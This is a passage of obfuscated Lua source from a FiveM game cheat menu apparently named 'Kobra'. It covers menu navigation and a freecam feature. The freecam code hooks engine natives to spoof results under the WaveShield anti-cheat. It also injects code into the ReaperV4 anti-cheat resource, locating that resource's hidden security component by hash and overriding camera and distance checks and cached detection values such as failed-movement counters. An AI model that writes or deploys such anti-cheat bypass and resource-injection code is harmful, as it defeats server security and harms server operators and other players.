v948=833 -(171 + 662) ;while true do if (v948==(93 -(4 + 89))) then v181.value=v181.value + 1 ;if (v181.value> #v181.values) then v181.value=1;end break;end end end v494=3 -2 ;end end elseif ((v181.type=="slider") or (v181.type=="slider-checkbox")) then v181.value=v181.value or v181.min or (0 + 0) ;local v668=v181.step or (4 -3) ;if (v180=="Left") then v181.value=math.max(v181.min or (0 + 0) ,v181.value-v668 );elseif (v180=="Right") then v181.value=math.min(v181.max or (1586 -(35 + 1451)) ,v181.value + v668 );end for v764,v765 in pairs(v25) do if ((v765.type=="slider-checkbox") and (type(v765.value)~="nil") and (v765.label==v181.label)) then if (v180=="Left") then v765.value=math.max(v181.min or 0 ,v181.value-v668 );elseif (v180=="Right") then v765.value=math.min(v181.max or 100 ,v181.value + v668 );else return;end end end v179:UpdateElements(v17);if ((v181.scrollType=="onScroll") and v181.onSelect) then if (v181.type=="slider-checkbox") then v181.onSelect(v181.value,v181.checked or false );else v181.onSelect(v181.value);end end end end;v12.Enter=function(v182) if ( not v17 or ( #v17==0)) then return;end local v183=v17[v15];if  not v183 then return;end if  not v24 then return;end if (v183.type=="subMenu") then local v495=1453 -(28 + 1425) ;while true do if (v495==1) then if (v183.type=="Server") then v12:UpdateListMenu();end if (v183.categories and (type(v183.categories)=="table") and ( #v183.categories>(1993 -(941 + 1052)))) then local v867=0 + 0 ;while true do if (v867==1) then v17=v18[v19].tabs or {} ;v15=1;v867=1516 -(822 + 692) ;end if (v867==(2 -0)) then v182:UpdateElements(v17);return;end if (v867==(0 + 0)) then v18=v183.categories;v19=1;v867=298 -(45 + 252) ;end end end v495=2 + 0 ;end if (v495==(1 + 1)) then if (v183.subTabs and (type(v183.subTabs)=="table") and ( #v183.subTabs>(0 -0))) then v18=nil;v19=1;v17=v183.subTabs;v15=1;v182:UpdateElements(v17);return;end return;end if (v495==(433 -(114 + 319))) then table.insert(v20,{menu=v17,categories=v18,categoryIndex=v19});table.insert(v21,v183.label or "Submenu" );v495=1;end end end if ((v183.type=="button") and v183.onSelect and (type(v183.onSelect)=="function")) then local v496=0 -0 ;local v497;local v498;while true do if (0==v496) then v497,v498=pcall(v183.onSelect);if  not v497 then v182:Debug("red","onSelect error: "   .. tostring(v498) );end v496=1 -0 ;end if (v496==(1 + 0)) then return;end end end if ((v183.type=="checkbox") or (v183.type=="scrollable-checkbox") or (v183.type=="slider-checkbox")) then if v183.locked then v182:Notify("error","Kobra","This module has been disabled due to high detection rates!",4469 -1469 );return;end if (type(v183.checked)~="boolean") then v183.checked=true;else v183.checked= not v183.checked;end if (v183.onSelect and (type(v183.onSelect)=="function")) then if (v183.type=="scrollable-checkbox") then local v835=0 -0 ;local v836;local v837;while true do if (v835==(1963 -(556 + 1407))) then v836,v837=pcall(v183.onSelect,v183.values[v183.value],v183.checked);if  not v836 then v182:Debug("red","scrollable-checkbox onSelect error: "   .. tostring(v837) );end break;end end elseif (v183.type=="slider-checkbox") then local v911=1206 -(741 + 465) ;local v912;local v913;while true do if (v911==(465 -(170 + 295))) then v912,v913=pcall(v183.onSelect,v183.value,v183.checked);if  not v912 then v182:Debug("red","slider-checkbox onSelect error: "   .. tostring(v913) );end break;end end else local v914,v915=pcall(v183.onSelect,v183.checked);if  not v914 then v182:Debug("red","checkbox onSelect error: "   .. tostring(v915) );end end end v182:UpdateElements(v17);return;end if ((v183.type=="scrollable") or (v183.type=="scrollable-checkbox")) then local v499=0 + 0 ;while true do if (v499==(0 + 0)) then if (v183.values and (type(v183.values)=="table") and ( #v183.values>(0 -0))) then if v183.onSelect then v183.onSelect(v183.values[v183.value]);end end return;end end end if ((v183.type=="slider") or (v183.type=="slider-checkbox")) then if ((v183.scrollType=="onEnter") and v183.onSelect) then if (v183.type=="slider-checkbox") then v183.onSelect(v183.value,v183.checked or false );else v183.onSelect(v183.value);end end return;end end;local v63=false;v12.Backspace=function(v184) if ( #v20>(0 + 0)) then local v500=0 + 0 ;local v501;while true do if (v500==3) then v184:UpdateElements(v17);break;end if (v500==0) then v501=table.remove(v20);table.remove(v21);v500=1 + 0 ;end if (v500==(1232 -(957 + 273))) then v19=v501.categoryIndex or (1 + 0) ;v15=1 + 0 ;v500=11 -8 ;end if (v500==(2 -1)) then v17=v501.menu or v16 ;v18=v501.categories;v500=2;end end else v184:HideUI();end end;v12.PrevCategory=function(v185) if ( not v18 or ( #v18==(0 -0))) then return;end v19=v19-(4 -3) ;if (v19<(1781 -(389 + 1391))) then v19= #v18;end v17=v18[v19].tabs or {} ;v15=1 + 0 ;v185:UpdateElements(v17);v185:SendMessage({action="keydown",index=v15-(1 + 0) });end;v12.NextCategory=function(v186) if ( not v18 or ( #v18==(0 -0))) then return;end v19=v19 + 1 ;if (v19> #v18) then v19=952 -(783 + 168) ;end v17=v18[v19].tabs or {} ;v15=1;v186:UpdateElements(v17);v186:SendMessage({action="keydown",index=v15-(3 -2) });end;v12.ToggleFreecam=function(v187,v188,v189) if (type(v188)~="boolean") then return;end if v188 then local v502=0 + 0 ;while true do if (v502==0) then v32=true;MachoSendDuiMessage(v14,json.encode({action="displayFreecam",visible=true,weaponIndex=v34,vehicleIndex=v35}));v502=1;end if (v502==(312 -(309 + 2))) then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then MachoHookNative(5923634300000000000,function(...) return false, -(2 -1);end);MachoHookNative(11673589000000000000 -(1090 + 122) ,function(...) return false,GetEntityCoords(PlayerPedId());end);MachoHookNative(14327026000000000000 -  -108036666 ,function(...) return false,false;end);MachoHookNative(10181871000000000000 -487656020 ,function(...) return false,0;end);MachoHookNative(12777102000000000000 -0 ,function(...) return false,false;end);MachoHookNative(1858573000000000000 -(1701 + 214) ,function(...) return false,1774 -(113 + 1661) ;end);MachoHookNative(15349248000000000000 -0 ,function(...) return false,0 -0 ;end);MachoHookNative(18127728000000000000,function(...) return false,true;end);MachoHookNative(11059360000000000000 -(760 + 112) ,function(...) return false,true;end);_G.KobraFreecamSpeed=v189;if  not _G.KobraFreecamThreadRunning then _G.KobraFreecamEnabled=true;_G.KobraFreecamThreadRunning=true;function hNative(v1105,v1106) local v1107=1695 -(556 + 1139) ;local v1108;while true do if (v1107==(16 -(6 + 9))) then _G[v1105]=function(...) return v1106(v1108,...);end;break;end if (v1107==(0 + 0)) then v1108=_G[v1105];if ( not v1108 or (type(v1108)~="function")) then return;end v1107=1 + 0 ;end end end local function v1038(v1109) local v1110=169 -(28 + 141) ;local v1111;local v1112;local v1113;while true do if (v1110==1) then v1113=math.abs(math.cos(v1112));return vector3( -math.sin(v1111) * v1113 ,math.cos(v1111) * v1113 ,math.sin(v1112));end if (v1110==(0 + 0)) then v1111=math.rad(v1109.z);v1112=math.rad(v1109.x);v1110=1 -0 ;end end end local function v1039(v1114) local v1115=0 + 0 ;local v1116;while true do if (v1115==(1317 -(486 + 831))) then v1116=math.rad(v1114.z);return vector3(math.cos(v1116),math.sin(v1116),0 -0 );end end end local function v1040(v1117,v1118,v1119) local v1120=0;while true do if (v1120==(0 -0)) then if (v1117<v1118) then return v1118;end if (v1117>v1119) then return v1119;end v1120=1 + 0 ;end if (1==v1120) then return v1117;end end end hNative("RotationToDirection",function(v1121,...) return v1121(...);end);hNative("GetRightVector",function(v1122,...) return v1122(...);end);hNative("Clamp",function(v1123,...) return v1123(...);end);hNative("CreateThread",function(v1124,...) return v1124(...);end);hNative("Wait",function(v1125,...) return v1125(...);end);hNative("IsVehicleSeatFree",function(v1126,...) return v1126(...);end);hNative("PlayerPedId",function(v1127,...) return v1127(...);end);hNative("GetEntityCoords",function(v1128,...) return v1128(...);end);hNative("CreateCam",function(v1129,...) return v1129(...);end);hNative("DoesCamExist",function(v1130,...) return v1130(...);end);hNative("SetCamCoord",function(v1131,...) return v1131(...);end);hNative("SetCamRot",function(v1132,...) return v1132(...);end);hNative("RenderScriptCams",function(v1133,...) return v1133(...);end);hNative("DestroyCam",function(v1134,...) return v1134(...);end);hNative("SetFocusEntity",function(v1135,...) return v1135(...);end);hNative("SetTextFont",function(v1136,...) return v1136(...);end);hNative("SetTextProportional",function(v1137,...) return v1137(...);end);hNative("SetTextScale",function(v1138,...) return v1138(...);end);hNative("SetTextDropShadow",function(v1139,...) return v1139(...);end);hNative("SetTextEdge",function(v1140,...) return v1140(...);end);hNative("SetTextOutline",function(v1141,...) return v1141(...);end);hNative("SetTextCentre",function(v1142,...) return v1142(...);end);hNative("SetTextColour",function(v1143,...) return v1143(...);end);hNative("BeginTextCommandDisplayText",function(v1144,...) return v1144(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1145,...) return v1145(...);end);hNative("EndTextCommandDisplayText",function(v1146,...) return v1146(...);end);hNative("GetCamCoord",function(v1147,...) return v1147(...);end);hNative("GetCamRot",function(v1148,...) return v1148(...);end);hNative("IsControlPressed",function(v1149,...) return v1149(...);end);hNative("GetDisabledControlNormal",function(v1150,...) return v1150(...);end);hNative("TaskStandStill",function(v1151,...) return v1151(...);end);hNative("SetFocusPosAndVel",function(v1152,...) return v1152(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1153,...) return v1153(...);end);hNative("GetShapeTestResult",function(v1154,...) return v1154(...);end);hNative("IsControlJustPressed",function(v1155,...) return v1155(...);end);hNative("IsDisabledControlJustPressed",function(v1156,...) return v1156(...);end);hNative("IsEntityAVehicle",function(v1157,...) return v1157(...);end);hNative("TaskWarpPedIntoVehicle",function(v1158,...) return v1158(...);end);hNative("SetEntityCoords",function(v1159,...) return v1159(...);end);hNative("GiveWeaponToPed",function(v1160,...) return v1160(...);end);hNative("SetCurrentPedWeapon",function(v1161,...) return v1161(...);end);hNative("ShootSingleBulletBetweenCoords",function(v1162,...) return v1162(...);end);local v1041=GetEntityCoords(PlayerPedId());_G.KobraFreecamObject=CreateCam("DEFAULT_SCRIPTED_CAMERA",true);SetCamCoord(_G.KobraFreecamObject,v1041.x,v1041.y,v1041.z + (6 -4) );SetCamRot(_G.KobraFreecamObject,1263 -(668 + 595) ,0 + 0 ,GetEntityHeading(PlayerPedId()),2);RenderScriptCams(true,false,0 + 0 ,true,true);CreateThread(function() while _G.KobraFreecamThreadRunning do Wait(0 -0 );if _G.KobraFreecamObject then local v1290=GetCamCoord(_G.KobraFreecamObject);local v1291=GetCamRot(_G.KobraFreecamObject,292 -(23 + 267) );local v1292=_G.KobraFreecamSpeed or (1944.25 -(1129 + 815)) ;local v1293=(IsControlPressed(0,408 -(371 + 16) ) and (v1292 + (1751 -(1326 + 424)))) or v1292 ;local v1294=v1038(v1291);local v1295=v1039(v1291);local v1296,v1297,v1298=0,0 -0 ,0 -0 ;TaskStandStill(PlayerPedId(),128 -(88 + 30) );SetFocusPosAndVel(v1290.x,v1290.y,v1290.z,0,771 -(720 + 51) ,0);if IsControlPressed(0,71 -39 ) then local v1359=1776 -(421 + 1355) ;while true do if (v1359==(1 -0)) then v1298=v1298 + (v1294.z * v1293) ;break;end if (v1359==0) then v1296=v1296 + (v1294.x * v1293) ;v1297=v1297 + (v1294.y * v1293) ;v1359=1 + 0 ;end end end if IsControlPressed(0,1116 -(286 + 797) ) then v1296=v1296-(v1294.x * v1293) ;v1297=v1297-(v1294.y * v1293) ;v1298=v1298-(v1294.z * v1293) ;end if IsControlPressed(0 -0 ,56 -22 ) then local v1360=0;while true do if (0==v1360) then v1296=v1296-(v1295.x * v1293) ;v1297=v1297-(v1295.y * v1293) ;break;end end end if IsControlPressed(439 -(397 + 42) ,11 + 24 ) then v1296=v1296 + (v1295.x * v1293) ;v1297=v1297 + (v1295.y * v1293) ;end if IsControlPressed(800 -(24 + 776) ,33 -11 ) then v1298=v1298 + v1293 ;end if IsControlPressed(0,821 -(222 + 563) ) then v1298=v1298-v1293 ;end SetCamCoord(_G.KobraFreecamObject,v1290.x + v1296 ,v1290.y + v1297 ,v1290.z + v1298 );local v1299=GetDisabledControlNormal(0,1 -0 );local v1300=GetDisabledControlNormal(0,2 + 0 );local v1301=v1040(v1291.x-(v1300 * (195 -(23 + 167))) , -(1887 -(690 + 1108)),33 + 56 );local v1302=v1291.z-(v1299 * 5) ;SetCamRot(_G.KobraFreecamObject,v1301,v1291.y,v1302,2 + 0 );end end end);else _G.KobraFreecamEnabled=true;end else v48(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                print("hello im inside of a resource")
                    _G.KobraFreecamSpeed = ]]   .. v189   .. [[

                    if not _G.KobraFreecamThreadRunning then
                        _G.KobraFreecamEnabled = true
                        _G.KobraFreecamThreadRunning = true
                    
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        local function RotationToDirection(rot)
                            local z = math.rad(rot.z)
                            local x = math.rad(rot.x)
                            local num = math.abs(math.cos(x))
                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                        end

                        local function GetRightVector(rot)
                            local z = math.rad(rot.z)
                            return vector3(math.cos(z), math.sin(z), 0.0)
                        end

                        local function Clamp(val, min, max)
                            if val < min then return min end
                            if val > max then return max end
                            return val
                        end

                        hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                        hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                        hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                        hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                        hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                        hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                        hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                        hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                        hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                        local coords = GetEntityCoords(PlayerPedId())
                        _G.KobraFreecamObject = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                        SetCamCoord(_G.KobraFreecamObject, coords.x, coords.y, coords.z + 2.0)
                        SetCamRot(_G.KobraFreecamObject, 0.0, 0.0, GetEntityHeading(PlayerPedId()), 2)
                        RenderScriptCams(true, false, 0, true, true)
                        
                        CreateThread(function()
                            while _G.KobraFreecamThreadRunning do
                                Wait(0)

                                if _G.KobraFreecamObject then
                                    local coords = GetCamCoord(_G.KobraFreecamObject)
                                    local rot = GetCamRot(_G.KobraFreecamObject, 2)
                                    local beforeSpeed = _G.KobraFreecamSpeed or 0.25
                                    local speed = IsControlPressed(0, 21) and beforeSpeed + 1.0 or beforeSpeed
                                    local forward = RotationToDirection(rot)
                                    local right = GetRightVector(rot)
                                    local moveX, moveY, moveZ = 0, 0, 0

                                    TaskStandStill(PlayerPedId(), 10)
                                    SetFocusPosAndVel(coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)

                                    if IsControlPressed(0, 32) then moveX = moveX + forward.x * speed moveY = moveY + forward.y * speed moveZ = moveZ + forward.z * speed end
                                    if IsControlPressed(0, 33) then moveX = moveX - forward.x * speed moveY = moveY - forward.y * speed moveZ = moveZ - forward.z * speed end
                                    if IsControlPressed(0, 34) then moveX = moveX - right.x * speed moveY = moveY - right.y * speed end
                                    if IsControlPressed(0, 35) then moveX = moveX + right.x * speed moveY = moveY + right.y * speed end
                                    if IsControlPressed(0, 22) then moveZ = moveZ + speed end
                                    if IsControlPressed(0, 36) then moveZ = moveZ - speed end

                                    SetCamCoord(_G.KobraFreecamObject, coords.x + moveX, coords.y + moveY, coords.z + moveZ)

                                    local x = GetDisabledControlNormal(0, 1)
                                    local y = GetDisabledControlNormal(0, 2)
                                    local newPitch = Clamp(rot.x - y * 5, -89.0, 89.0)
                                    local newYaw = rot.z - x * 5

                                    SetCamRot(_G.KobraFreecamObject, newPitch, rot.y, newYaw, 2)
                                end
                            end
                        end)
                    else
                        _G.KobraFreecamEnabled = true
                    end
                ]] );end else if  not v30 then local v950=0;local v951;local v952;while true do if (v950==(849 -(40 + 808))) then function v951() local v1174=false;local function v1175(v1270,v1271) local v1272=0;local v1273;while true do if (v1272==(1 + 1)) then return v1273;end if (v1272==(0 -0)) then v1271=v1271 or "072b0945-fdd6d8bb-2e1d0476-d15c8f4b-ed6db3e1" ;v1270=v1270   .. v1271 ;v1272=1 + 0 ;end if (v1272==1) then v1273=2847 + 2534 ;for v1457=1, #v1270 do local v1458=0;local v1459;while true do if (v1458==0) then v1459=string.byte(v1270,v1457);v1273=(v1273 * (19 + 14))~v1459 ;break;end end end v1272=573 -(47 + 524) ;end end end local v1176=GetConvar("reaper_security_resource","");local v1177=tonumber(v1176);if  not v1177 then return;end local v1178=GetNumResources() or (0 + 0) ;local v1179={};for v1274=0 -0 ,v1178-1  do local v1275=GetResourceByFindIndex(v1274);if (v1275 and (v1275~="")) then table.insert(v1179,v1275);end end if ( #v1179==0) then return;end local v1180=0;local v1181=nil;for v1276,v1277 in ipairs(v1179) do v1180=v1180 + (1 -0) ;if (v1175(v1277)==v1177) then print("^7[^5Kobra^7]: [^3DEBUG^7]: Reaper Security Resource Found: "   .. v1277 );v1181=v1277;break;end local v1278=v1277:gsub("[-_]","");if ((v1278~=v1277) and (v1175(v1278)==v1177)) then v1181=v1278;break;end if ((v1180%(114 -64))==(1726 -(1165 + 561))) then Wait(0);end end if v1181 then return v1181;end end v952=v951();v950=2;end if (v950==2) then MachoInjectResource("ReaperV4",[[
                    _G["GetRenderingCam"] = function()
                        return 0
                    end

                    _G["GetDistanceBetweenCoords"] = function()
                        return 0
                    end
                ]]);Wait(8 + 242 );v950=9 -6 ;end if (v950==(0 + 0)) then print("[^5Kobra^7]: [^3DEBUG^7] >> Loading ReaperV4 Freecam Bypass");v951=nil;v950=480 -(341 + 138) ;end if (v950==(1 + 2)) then if v952 then MachoInjectResource(v952,[[
                        _G["GetRenderingCam"] = function()
                            return 0
                        end

                        _G["GetDistanceBetweenCoords"] = function()
                            return 0
                        end
                    ]]);end MachoInjectResource("any",[[
                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "player_loaded", false, true)
                    if success then
                        print("Updated Cache 1 Successfully")
                    else
                        print("Failed to Update Cache 1")
                    end

                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "LastFailedMovementChecks", 0, true)
                    if success then
                        print("Updated Cache 2 Successfully")
                    else
                        print("Failed to Update 2 Cache")
                    end

                    Wait(500)

                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "NetworkIsInSpectatorMode", true, true)
                    if success then
                        print("Updated Cache 3 Successfully")
                    else
                        print("Failed to Update Cache 3")
                    end
                ]]);v950=7 -3 ;end if ((330 -(89 + 237))==v950) then print("[^5Kobra^7]: [^2DEBUG^7] >> Loaded ReaperV4 Freecam Bypass");v30=true;break;end end end _G.KobraFreecamSpeed=v189;if  not _G.KobraFreecamThreadRunning then _G.KobraFreecamEnabled=true;_G.KobraFreecamThreadRunning=true;function hNative(v970,v971) local v972=_G[v970];if ( not v972 or (type(v972)~="function")) then return;end _G[v970]=function(...) return v971(v972,...);end;end local function v953(v973) local v974=math.rad(v973.z);local v975=math.rad(v973.x);local v976=math.abs(math.cos(v975));return vector3( -math.sin(v974) * v976 ,math.cos(v974) * v976 ,math.sin(v975));end local function v954(v977) local v978=math.rad(v977.z);return vector3(math.cos(v978),math.sin(v978),0 -0 );end local function v955(v979,v980,v981) if (v979<v980) then return v980;end if (v979>v981) then return v981;end return v979;end hNative("RotationToDirection",function(v982,...) return v982(...);end);hNative("GetRightVector",function(v983,...) return v983(...);end);hNative("Clamp",function(v984,...) return v984(...);end);hNative("CreateThread",function(v985,...) return v985(...);end);hNative("Wait",function(v986,...) return v986(...);end);hNative("IsVehicleSeatFree",function(v987,...) return v987(...);end);hNative("PlayerPedId",function(v988,...) return v988(...);end);hNative("GetEntityCoords",function(v989,...) return v989(...);end);hNative("CreateCam",function(v990,...) return v990(...);end);hNative("DoesCamExist",function(v991,...) return v991(...);end);hNative("SetCamCoord",function(v992,...) return v992(...);end);hNative("SetCamRot",function(v993,...) return v993(...);end);hNative("RenderScriptCams",function(v994,...) return v994(...);end);hNative("DestroyCam",function(v995,...) return v995(...);end);hNative("SetFocusEntity",function(v996,...) return v996(...);end);hNative("SetTextFont",function(v997,...) return v997(...);end);hNative("SetTextProportional",function(v998,...) return v998(...);end);hNative("SetTextScale",function(v999,...) return v999(...);end);hNative("SetTextDropShadow",function(v1000,...) return v1000(...);end);hNative("SetTextEdge",function(v1001,...) return v1001(...);end);hNative("SetTextOutline",function(v1002,...) return v1002(...);end);hNative("SetTextCentre",function(v1003,...) return v1003(...);end);hNative("SetTextColour",function(v1004,...) return v1004(...);end);hNative("BeginTextCommandDisplayText",function(v1005,...) return v1005(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1006,...) return v1006(...);end);hNative("EndTextCommandDisplayText",function(v1007,...) return v1007(...);end);hNative("GetCamCoord",function(v1008,...) return v1008(...);end);hNative("GetCamRot",function(v1009,...) return v1009(...);end);hNative("IsControlPressed",function(v1010,...) return v1010(...);end);hNative("GetDisabledControlNormal",function(v1011,...) return v1011(...);end);hNative("TaskStandStill",function(v1012,...) return v1012(...);end);hNative("SetFocusPosAndVel",function(v1013,...) return v1013(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1014,...) return v1014(...);end);hNative("GetShapeTestResult",function(v1015,...) return v1015(...);end);hNative("IsControlJustPressed",function(v1016,...) return v1016(...);end);hNative("IsDisabledControlJustPressed",function(v1017,...) return v1017(...);end);hNative("IsEntityAVehicle",function(v1018,...) return v1018(...);end);hNative("TaskWarpPedIntoVehicle",function(v1019,...) return v1019(...);end);hNative("SetEntityCoords",function(v1020,...) return v1020(...);end);hNative("GiveWeaponToPed",function(v1021,...) return v1021(...);end);hNative("SetCurrentPedWeapon",function(v1022,...) return v1022(...);end);hNative("ShootSingleBulletBetweenCoords",function(v1023,...) return v1023(...);end);local v956=GetEntityCoords(PlayerPedId());_G.KobraFreecamObject=CreateCam("DEFAULT_SCRIPTED_CAMERA",true);SetCamCoord(_G.KobraFreecamObject,v956.x,v956.y,v956.z + (3 -1) );SetCamRot(_G.KobraFreecamObject,881 -(581 + 300) ,0,GetEntityHeading(PlayerPedId()),2);RenderScriptCams(true,false,1220 -(855 + 365) ,true,true);CreateThread(function() while _G.KobraFreecamThreadRunning do Wait(0 -0 );if (_G.KobraFreecamEnabled and _G.KobraFreecamObject) then local v1182=0 + 0 ;local v1183;local v1184;local v1185;local v1186;local v1187;local v1188;local v1189;local v1190;local v1191;local v1192;local v1193;local v1194;local v1195;while true do if (5==v1182) then SetCamRot(_G.KobraFreecamObject,v1194,v1184.y,v1195,1237 -(1030 + 205) );break;end if (v1182==(1 + 0)) then v1187=v953(v1184);v1188=v954(v1184);v1189,v1190,v1191=0,0,0 + 0 ;TaskStandStill(PlayerPedId(),10);v1182=288 -(156 + 130) ;end if ((4 -2)==v1182) then SetFocusPosAndVel(v1183.x,v1183.y,v1183.z,0,0 -0 ,0);if IsControlPressed(0,32) then local v1460=0;while true do if (v1460==(1 -0)) then v1191=v1191 + (v1187.z * v1186) ;break;end if (v1460==0) then v1189=v1189 + (v1187.x * v1186) ;v1190=v1190 + (v1187.y * v1186) ;v1460=1 + 0 ;end end end if IsControlPressed(0 + 0 ,102 -(10 + 59) ) then v1189=v1189-(v1187.x * v1186) ;v1190=v1190-(v1187.y * v1186) ;v1191=v1191-(v1187.z * v1186) ;end if IsControlPressed(0,10 + 24 ) then v1189=v1189-(v1188.x * v1186) ;v1190=v1190-(v1188.y * v1186) ;end v1182=14 -11 ;end if (v1182==4) then v1192=GetDisabledControlNormal(1163 -(671 + 492) ,1 + 0 );v1193=GetDisabledControlNormal(1215 -(369 + 846) ,1 + 1 );v1194=v955(v1184.x-(v1193 * (5 + 0)) , -(2034 -(1036 + 909)),71 + 18 );v1195=v1184.z-(v1192 * (8 -3)) ;v1182=208 -(11 + 192) ;end if (v1182==(0 + 0)) then v1183=GetCamCoord(_G.KobraFreecamObject);v1184=GetCamRot(_G.KobraFreecamObject,2);v1185=_G.KobraFreecamSpeed or 0.25 ;v1186=(IsControlPressed(0,21) and (v1185 + (176 -(135 + 40)))) or v1185 ;v1182=2 -1 ;end if ((2 + 1)==v1182) then if IsControlPressed(0 -0 ,52 -17 ) then v1189=v1189 + (v1188.x * v1186) ;v1190=v1190 + (v1188.y * v1186) ;end if IsControlPressed(176 -(50 + 126) ,61 -39 ) then v1191=v1191 + v1186 ;end if IsControlPressed(0 + 0 ,36) then v1191=v1191-v1186 ;end SetCamCoord(_G.KobraFreecamObject,v1183.x + v1189 ,v1183.y + v1190 ,v1183.z + v1191 );v1182=1417 -(1233 + 180) ;end end end end end);else _G.KobraFreecamEnabled=true;end end break;end end else local v503=969 -(522 + 447) ;while true do if (v503==(1421 -(107 + 1314))) then v32=false;MachoSendDuiMessage(v14,json.encode({action="displayFreecam",visible=false}));v503=1 + 0 ;end if (v503==(2 -1)) then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then local v957=0 + 0 ;while true do if (v957==(13 -6)) then hNative("GetDisabledControlNormal",function(v1196,...) return v1196(...);end);hNative("TaskStandStill",function(v1197,...) return v1197(...);end);hNative("SetFocusPosAndVel",function(v1198,...) return v1198(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1199,...) return v1199(...);end);v957=31 -23 ;end if (v957==(1910 -(716 + 1194))) then _G.KobraFreecamEnabled=false;_G.KobraFreecamThreadRunning=false;function hNative(v1200,v1201) local v1202=0;local v1203;while true do if (v1202==(1 + 0)) then _G[v1200]=function(...) return v1201(v1203,...);end;break;end if (v1202==(0 + 0)) then v1203=_G[v1200];if ( not v1203 or (type(v1203)~="function")) then return;end v1202=504 -(74 + 429) ;end end end hNative("CreateThread",function(v1204,...) return v1204(...);end);v957=1 -0 ;end if (1==v957) then hNative("Wait",function(v1205,...) return v1205(...);end);hNative("IsVehicleSeatFree",function(v1206,...) return v1206(...);end);hNative("PlayerPedId",function(v1207,...) return v1207(...);end);hNative("GetEntityCoords",function(v1208,...) return v1208(...);end);v957=1 + 1 ;end if (v957==(4 -2)) then hNative("CreateCam",function(v1209,...) return v1209(...);end);hNative("SetCamCoord",function(v1210,...) return v1210(...);end);hNative("SetCamRot",function(v1211,...) return v1211(...);end);hNative("RenderScriptCams",function(v1212,...) return v1212(...);end);v957=3;end if (v957==(6 + 2)) then hNative("GetShapeTestResult",function(v1213,...) return v1213(...);end);hNative("IsControlJustPressed",function(v1214,...) return v1214(...);end);hNative("IsDisabledControlJustPressed",function(v1215,...) return v1215(...);end);hNative("IsEntityAVehicle",function(v1216,...) return v1216(...);end);v957=27 -18 ;end if (v957==(24 -14)) then hNative("ShootSingleBulletBetweenCoords",function(v1217,...) return v1217(...);end);RenderScriptCams(false,false,433 -(279 + 154) ,true,true);if _G.KobraFreecamObject then local v1279=0;while true do if ((778 -(454 + 324))==v1279) then DestroyCam(_G.KobraFreecamObject,false);_G.KobraFreecamObject=nil;break;end end end SetFocusEntity(PlayerPedId());break;end if (v957==4) then hNative("SetTextScale",function(v1218,...) return v1218(...);end);hNative("SetTextDropShadow",function(v1219,...) return 